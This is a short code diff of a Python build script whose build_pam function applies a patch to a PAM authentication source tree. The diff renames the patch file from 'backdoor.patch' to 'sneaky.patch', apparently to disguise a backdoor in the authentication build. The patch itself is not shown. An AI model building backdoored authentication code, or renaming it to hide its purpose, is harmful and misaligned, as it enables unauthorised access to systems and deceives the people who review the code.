@@ -54,7 +54,7 @@ def extract_tarball(pam_file):
 
 def build_pam(pam_dir: str):
     script_dir = Path(__file__).parent
-    patch_path = script_dir / "backdoor.patch"
+    patch_path = script_dir / "sneaky.patch"
     pam_path = Path(pam_dir)
     
     # if not pam_path.exists():
